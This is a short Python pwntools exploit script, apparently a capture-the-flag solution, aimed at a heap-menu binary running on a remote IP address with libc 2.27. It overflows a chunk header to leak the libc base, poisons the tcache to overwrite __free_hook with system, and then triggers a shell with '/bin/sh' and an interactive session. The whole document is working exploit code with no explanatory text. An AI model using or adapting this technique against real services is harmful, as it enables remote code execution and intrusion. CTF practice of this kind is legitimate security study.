from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']

#io=process('./unknown')
io=remote('122.112.212.41',6666)
libc=ELF('./libc-2.27.so')

def add(idx,size):
    io.recvuntil('choice:')
    io.sendline('1')
    io.recvuntil('Index:')
    io.sendline(str(idx))
    io.recvuntil('Size:')
    io.sendline(str(size))

def free(idx):
    io.recvuntil('choice:')
    io.sendline('4')
    io.recvuntil('Index:')
    io.sendline(str(idx))


def edit(idx,data):
    io.recvuntil('choice:')
    io.sendline('2')
    io.recvuntil('Index:')
    io.sendline(str(idx))
    io.sendline(data)

def show(idx):
    io.recvuntil('choice:')
    io.sendline('3')
    io.recvuntil('Index:')
    io.sendline(str(idx))


add(15,0x0)
add(14,0x1f0)
add(13,0x1f0)
add(12,0x50)
add(-1,0x60)
edit(15,'a'*0x18+p64(0x461))
free(14)
add(11,0x1f0)
show(13)
libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3ebca0
free_hook=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']
print(hex(libc_base))
add(10,0x1f0)
free(10)
free(13)
add(10,0x1f0)
edit(10,p64(free_hook))
add(9,0x1f0)
edit(9,'/bin/sh\x00')
add(8,0x1f0)
edit(8,p64(sys))
free(9)
#gdb.attach(io)

io.interactive()
